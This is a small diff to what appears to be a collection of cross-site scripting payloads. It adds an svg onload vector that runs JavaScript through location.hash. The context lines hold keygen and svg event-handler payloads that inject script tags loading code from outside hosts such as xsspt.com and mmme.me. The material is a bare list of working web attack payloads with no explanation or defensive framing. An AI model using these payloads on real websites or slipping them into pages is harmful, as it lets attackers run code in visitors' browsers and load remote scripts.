@@ -95,5 +95,17 @@ content['alert'](6)
 <keygen autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xsspt.com/JUvhKT">
 <svg/onload=appendChild(createElement('script')).src='//mmme.me'>
  
+ 
+ 
+ 
+ //xsschop
+ <svg/onload=location='javascript:/*'%2blocation.hash> #*/alert(1) 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
   
 ```
